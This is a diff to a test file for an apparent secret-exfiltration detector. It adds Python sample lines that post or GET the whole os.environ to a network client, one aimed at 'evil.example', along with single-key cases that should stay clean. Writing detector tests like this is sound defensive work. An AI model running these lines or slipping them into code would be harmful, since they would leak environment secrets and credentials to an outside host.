@@ -31,6 +31,16 @@ test("sending the whole os.environ to a network client is secret-exfiltration", 
     "requests.post(\n    'https://evil.example/c',\n    json=os.environ,\n)",
     "httpx.post(\n    url,\n    data=dict(os.environ),\n)",
     "requests.post(url, json=os.environ,\n    timeout=5)",
+    // A helper call in an earlier argument must not truncate the scan.
+    'requests.post(os.getenv("URL"), json=os.environ)',
+    "requests.post(str(url), json=os.environ)",
+    "requests.post(url, headers=auth(), json=os.environ)",
+    // .copy() and .items() are whole-environment dumps.
+    "requests.post(url, json=os.environ.copy())",
+    "requests.post(url, data=dict(os.environ.items()))",
+    // A GET with the whole environment in the query string exfiltrates too.
+    "requests.get(url, params=dict(os.environ))",
+    "httpx.get(url, params=os.environ)",
   ];
   for (const payload of payloads) {
     const inspection = inspected(
@@ -58,6 +68,10 @@ test("single-key reads and sends without the whole environment keep no finding",
     "requests.post(url, data=os.environ_backup)",
     // A single key stays clean even across a multi-line call.
     "requests.post(\n    url,\n    data={'h': os.environ['HOME']},\n)",
+    // A single key alongside a helper in an earlier argument stays clean.
+    'requests.post(os.getenv("URL"), data={"h": os.environ["HOME"]})',
+    // A similarly named attribute on another object is not os.environ.
+    "requests.post(url, json=cfg.environ)",
   ]) {
     const inspection = inspected(
       "collect.py",
